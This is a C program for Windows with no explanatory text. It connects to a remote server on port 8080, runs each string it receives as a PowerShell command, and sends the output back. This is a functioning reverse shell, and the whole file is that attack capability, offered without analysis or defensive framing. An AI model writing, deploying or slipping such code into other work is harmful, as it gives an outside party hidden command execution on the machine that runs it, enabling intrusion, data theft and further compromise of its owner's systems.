#include <stdio.h>
#include <winsock2.h>
#include <ws2tcpip.h> // For struct addrinfo, getaddrinfo, freeaddrinfo
#define DEFAULT_PORT "8080"
#define RECVBUF_SIZE 1024

int main(int argc, char *argv[]) {

    if (argc < 2) {
        fprintf(stderr, "Usage: %s <server-address>\n", argv[0]);
        return 1;
    }

    //Initialize Winsock

    WSADATA wsaData;

    int iResult;
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);

    if (iResult != 0) {
        fprintf(stderr, "WSAStartup failed: %d\n", iResult);
        return 1;
    }

    //Create a socket
    struct addrinfo *result = NULL,
                    *ptr = NULL,
                    hints;

    ZeroMemory( &hints, sizeof(hints) );
    hints.ai_family   = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
    iResult = getaddrinfo(argv[1], DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        fprintf(stderr, "getaddrinfo failed: %d\n", iResult);
        WSACleanup();
        return 1;
    }
    SOCKET ConnectSocket = INVALID_SOCKET;
    for(ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            continue;
        }
        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }   
    printf("Connected to server!\n");

    while (1) {
        int bufsize = RECVBUF_SIZE;
        int totalReceived = 0;
        char *recvbuf = malloc(bufsize);
        if (!recvbuf) {
            fprintf(stderr, "Allocation error\n");
            break;
        }

        int bytesReceived;
        // Receive command from server (dynamic buffer)
        while ((bytesReceived = recv(ConnectSocket, recvbuf + totalReceived, bufsize - totalReceived - 1, 0)) > 0) {
            totalReceived += bytesReceived;
            // If buffer is full, grow it
            if (totalReceived >= bufsize - 1) {
                bufsize += RECVBUF_SIZE;
                char *newbuf = realloc(recvbuf, bufsize);
                if (!newbuf) {
                    fprintf(stderr, "Reallocation error\n");
                    free(recvbuf);
                    closesocket(ConnectSocket);
                    WSACleanup();
                    return 1;
                }
                recvbuf = newbuf;
            }
            // If less than requested, assume end of message (for simple protocols)
            if (bytesReceived < RECVBUF_SIZE - 1) break;
        }

        if (bytesReceived <= 0) {
            // Connection closed or error
            free(recvbuf);
            printf("Server closed connection or error occurred.\n");
            break;
        }

        recvbuf[totalReceived] = '\0';
        printf("Received command: %s\n", recvbuf);

        // Build PowerShell command
        char cmd[1100];
        snprintf(cmd, sizeof(cmd), "powershell -Command \"%s\"", recvbuf);

        // Execute command and send output back to server
        FILE *fp = _popen(cmd, "r");
        if (fp == NULL) {
            const char *failmsg = "Failed to run command\n";
            send(ConnectSocket, failmsg, (int)strlen(failmsg), 0);
        } else {
            char output[1024];
            int sent_error = 0;
            while (fgets(output, sizeof(output), fp) != NULL) {
                // Send each chunk of output to the server
                int len = (int)strlen(output);
                if (send(ConnectSocket, output, len, 0) == SOCKET_ERROR) {
                    printf("Failed to send output to server.\n");
                    sent_error = 1;
                    break;
                }
            }
            _pclose(fp);
            // Optionally, send a marker to indicate end of output
            if (!sent_error) {
                const char *eom = "\x04"; // EOT (End of Transmission)
                send(ConnectSocket, eom, 1, 0);
            }
        }
        free(recvbuf);
    }

    closesocket(ConnectSocket);
    WSACleanup();
    return 0;
}




